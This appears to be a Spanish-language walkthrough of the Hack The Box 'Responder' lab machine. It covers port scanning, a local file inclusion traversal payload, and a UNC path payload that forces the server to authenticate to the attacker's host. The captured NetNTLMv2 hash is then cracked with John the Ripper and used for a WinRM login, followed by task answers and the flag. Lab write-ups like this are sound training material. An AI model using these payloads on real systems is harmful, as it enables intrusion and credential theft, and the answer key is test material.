# Responder

### 1. 📝 **Introducción**

* **Nivel de Dificultad**: Muy fácil.
* **Tags:**&#x20;
  * **WinRM:** Protocolo de administración remota en Windows.
  * **Custom Applications:** Aplicaciones desarrolladas específicamente para un propósito.
  * **Protocols:** Conjunto de reglas para la comunicación entre dispositivos.
  * **XAMPP:** Paquete de software que incluye Apache, MySQL, PHP y Perl.
  * **SMB:** Protocolo de red para compartir archivos en Windows.
  * **Responder:** Herramienta para capturar credenciales en redes.
  * **PHP:** Lenguaje de scripting para desarrollo web.
  * **Reconnaissance:** Fase de recolección de información en seguridad.
  * **Password Cracking:** Proceso de descifrar contraseñas.
  * **Hash Capture:** Técnica para interceptar y almacenar hashes de contraseñas.
  * **Remote File Inclusion:** Vulnerabilidad que permite incluir archivos remotos en aplicaciones.
  * **Remote Code Execution:** Ejecución de código en un sistema a distancia.

### 2. 🛠️ **Entorno**

Nos descargamos nuestra VPN y nos conectamos.

```
sudo openvpn nombre_del_archivo.vpn
```

Iniciamos la máquina y verificamos la conexión.

```bash
ping -c 1 10.129.112.41
```

<figure><img src="../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

Observamos que tenemos conexión y que es una máquina **Windows** ya que su **ttl=127**.

### 3. 🔍 **Reconocimiento**

A continuación, se realiza el comando:

```bash
nmap -p- --min-rate 5000 -sV 10.129.112.41
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

### 4. 🚪 **Acceso Inicial**

Como podemos observar durante el escaneo, el **puerto 80** está abierto y está sirviendo **HTTP** con Apache httpd 2.4.52 (Win64) junto con OpenSSL/1.1.1m y PHP/8.1.1. Además, el **puerto 5985** está abierto y está sirviendo **HTTP** con Microsoft HTTPAPI httpd 2.0 (utilizado por SSDP/UPnP). Por último, el **puerto 7680** está abierto, pero no se identifica claramente el servicio asociado, indicado como `pando-pub`. Todos estos servicios están corriendo en un sistema operativo Windows, lo que nos llevará a investigar más a fondo.

<figure><img src="../../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

Hay que añadir en el `/etc/hosts` el dominio de **unika.htb** con la IP. Se recarga la página.

```bash
10.129.112.41    unika.htb
```

<figure><img src="../../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>

Revisando el código fuente nos encontramos una vulnerabilidad LFI y nos damos cuenta cuándo la página cambia de idioma.

<figure><img src="../../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

El enlace intenta explotar una vulnerabilidad de **Inclusión de Archivos Locales** (LFI) en la aplicación web. Al acceder a la URL, estamos intentando cargar y mostrar el contenido del archivo `hosts` del sistema operativo Windows en el servidor, ubicado en `C:\Windows\System32\drivers\etc\hosts`. Esta vulnerabilidad nos permitiría leer archivos arbitrarios del sistema.

```bash
http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts
```

Funciona.  Vamos a intentar capturar el **hash NetNTLMv2** del administrador utilizando **Responder**. Para entender mejor el proceso, expliquemos brevemente lo que haremos.

Aprovechando la vulnerabilidad de **LFI** (Local File Inclusion), pediremos al servidor que intente conectarse a un recurso SMB en nuestra máquina local. Al hacer esto, el servidor Windows tratará de autenticarse con nuestra máquina utilizando el protocolo NTLM (New Technology Lan Manager), que es un sistema de autenticación desafío-respuesta desarrollado por Microsoft.

Durante este proceso, NTLM generará una cadena específicamente formateada que incluye tanto el desafío como la respuesta. Esta cadena es conocida como **NetNTLMv2**. Aunque comúnmente se le llama "hash NetNTLMv2", técnicamente no es un hash tradicional, pero se ataca de manera similar.

Con **Responder**, capturaremos esta cadena NetNTLMv2. Luego intentaremos descifrarla utilizando **John The Ripper** para ver qué información podemos obtener y cómo podemos usarla.

<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

Lo primero que haremos será iniciar **Responder**, configurándolo para que escuche en la interfaz de red `tun1`, que es la interfaz por la que estamos conectados al servidor remoto. Nuestra IP, según ve el servidor, es `10.10.16.97`.

<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

Ahora, volvemos al navegador y cargamos la siguiente URL:

```ruby
http://unika.htb/?page=//10.10.xx.xx/algo
```

Con esta acción, estamos indicando al servidor que intente acceder al recurso “algo” que supuestamente está disponible en un equipo remoto (nuestro equipo con la IP `10.10.xx.xx`) a través del protocolo SMB. Luego, regresamos a nuestro terminal donde está corriendo **Responder** para monitorear cualquier intento de autenticación que el servidor haga hacia nuestra máquina.

<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

Con esto observamos que nos captura el hash. Copiamos el valor del hash NTLMv2 capturado y lo guardamos en un nuevo archivo. Luego, utilizamos el diccionario `rockyou.txt` para intentar descifrar el hash con **John the Ripper**.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt script.hash
```

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

Hemos obtenido la contraseña del usuario Administrador, por lo que ahora vamos a investigar el puerto **5985**. Para más detalles sobre este puerto, podemos consultar la siguiente página: [SpeedGuide - Puerto 5985](https://www.speedguide.net/port.php?port=5985). Pertenece al servicio WinRM por lo que hay que investigar como explotarlo. Para obtener más detalles sobre cómo explotar este servicio, podemos consultar la siguiente página: [Pentesting - WinRM](https://pentesting.mrw0l05zyn.cl/explotacion/servicios/5985-tcp-5986-tcp-winrm).

```bash
evil-winrm -i 10.129.112.41 -u administrator -p badminton
```

### 5. 🔑 **Captura de la Flag**

Una vez que nos conectemos usando **evil-winrm**, obtendremos una shell que nos permitirá explorar el servidor remoto en busca de nuestra flag. Indagamos a través de los directorios.

<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

### 6. ❓Preguntas

#### **Tarea 1:** ¿A qué dominio somos redirigidos al visitar el servicio web utilizando la dirección IP?

**unika.htb**&#x20;

_Al visitar el servicio web con la dirección IP, somos redirigidos al dominio `unika.htb`._

#### **Tarea 2:** ¿Qué lenguaje de scripting se está utilizando en el servidor para generar las páginas web?

**php**&#x20;

_El servidor utiliza el lenguaje de scripting **PHP** para generar las páginas web._

#### **Tarea 3:** ¿Cuál es el nombre del parámetro de URL que se usa para cargar diferentes versiones de idioma de la página web?

**page**&#x20;

_El parámetro de URL utilizado para cargar diferentes versiones de idioma es **page**._

#### **Tarea 4:** ¿Cuál de los siguientes valores para el parámetro `page` sería un ejemplo de explotación de una vulnerabilidad de Inclusión de Archivos Locales (LFI)?

**../../../../../../../../windows/system32/drivers/etc/hosts**&#x20;

_El valor `../../../../../../../../windows/system32/drivers/etc/hosts` es un ejemplo de explotación de una vulnerabilidad de Inclusión de Archivos Locales (LFI)._

#### **Tarea 5:** ¿Cuál de los siguientes valores para el parámetro `page` sería un ejemplo de explotación de una vulnerabilidad de Inclusión de Archivos Remotos (RFI)?

**//10.10.14.6/somefile**&#x20;

_El valor `//10.10.14.6/somefile` es un ejemplo de explotación de una vulnerabilidad de Inclusión de Archivos Remotos (RFI)._

#### **Tarea 6:** ¿Qué significa NTLM?

**New Technology Lan Manager**&#x20;

_NTLM significa **New Technology Lan Manager**._

#### **Tarea 7:** ¿Qué flag utilizamos en la utilidad Responder para especificar la interfaz de red?

**-I**&#x20;

_El flag `-I` en la utilidad **Responder** se utiliza para especificar la interfaz de red._

#### **Tarea 8:** Existen varias herramientas que toman un desafío/respuesta NetNTLMv2 y prueban millones de contraseñas para ver si alguna genera la misma respuesta. Una de estas herramientas se conoce comúnmente como `john`, pero ¿cuál es su nombre completo?

**John The Ripper**&#x20;

_El nombre completo de la herramienta comúnmente conocida como `john` es **John The Ripper**._

#### **Tarea 9:** ¿Cuál es la contraseña del usuario administrador?

**badminton**&#x20;

_La contraseña del usuario administrador es **badminton**._

#### **Tarea 10:** Usaremos un servicio de Windows (es decir, ejecutándose en la máquina) para acceder remotamente a la máquina de Responder utilizando la contraseña que recuperamos. ¿En qué puerto TCP escucha?

**5985**&#x20;

_El servicio de Windows al que accedemos remotamente utiliza el puerto TCP **5985**._

#### Tarea 11: Enviar Flag

ea81b7afddd03efaa0945333ed147fac

<figure><img src="../../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>
